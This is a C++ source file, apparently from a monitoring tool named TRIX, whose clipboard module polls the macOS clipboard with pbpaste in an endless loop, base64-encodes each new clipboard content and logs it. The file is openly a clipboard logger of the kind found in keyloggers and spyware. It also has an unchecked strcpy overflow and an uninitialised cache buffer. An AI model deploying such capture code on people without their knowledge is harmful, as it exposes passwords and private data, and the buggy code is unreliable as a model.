#include <cstdlib>
#include <stdio.h>
#include <iostream>
#include <thread>
#include "TXClipboard.h"
#include "TXConfig.h"
#include "TXLogger.h"
#include "base64.h"

void TXCLipboard::operator()() {
    TXLogger *logger = TXLogger::instance();
//    logger->writeln("[[C] CLIPBOARD INITIALIZED]");

    FILE *pop;
    char buffer[TRIX_CLIPBOARD_MAX_BYTES];
    char cachedBuffer[TRIX_CLIPBOARD_MAX_BYTES];

    int tryCount = 0;

    while (true) {
        pop = popen("pbpaste", "r");

        if (pop == 0) {
            tryCount++;
            this->wait();
            continue;
        }

        // Verifica se o limite máximo de falhas ao capturar o OUT do popen for atingido.
        if (tryCount >= TRIX_RETRY_MAX_COUNT) {
            logger->e("TRIXClipboard interrompido. Limite máximo de tentativas atingido!");
            break;
        }

        std::string ctData;

        // Lê o clipboard até o buff limite
        while (fgets(buffer, TRIX_CLIPBOARD_MAX_BYTES, pop)) {
            if (strcmp("", buffer) == 0) {
                continue;
            }

            ctData += buffer;
        }

        if (!ctData.empty()) {
            // Codifica em base 64 a string do clipboard, para garantir integridade nos dados.
            ctData = base64_encode(reinterpret_cast<const unsigned char*>(ctData.c_str()), (unsigned int) ctData.length());

            // Transforma a String C++ para String C, para comparar
            const char *ctData_cStr = ctData.c_str();

            // Compara o buffer atual, com o buffer em cache (da ultima gravação do clipboard), para ver se existem alterações que devem ser gravadas.
            if (strcmp(ctData_cStr, cachedBuffer) != 0) {
                logger->write("[t:");
                logger->write("[");
                logger->write(ctData);

                if(TXLogger::instance()->blockNewLineOnGroups) {
                    logger->write("]");
                }else{
                    logger->writeln("]");
                }

                // Armazena o buffer gravado, para o cache para comparar nas iterações seguintes.
                strcpy(cachedBuffer, ctData_cStr);
            }
        }

        // Libera
        pclose(pop);

        this->wait();
    }

}

void TXCLipboard::wait() {
    std::this_thread::sleep_for(std::chrono::milliseconds(TRIX_CLIPBOARD_INTERVAL));
}



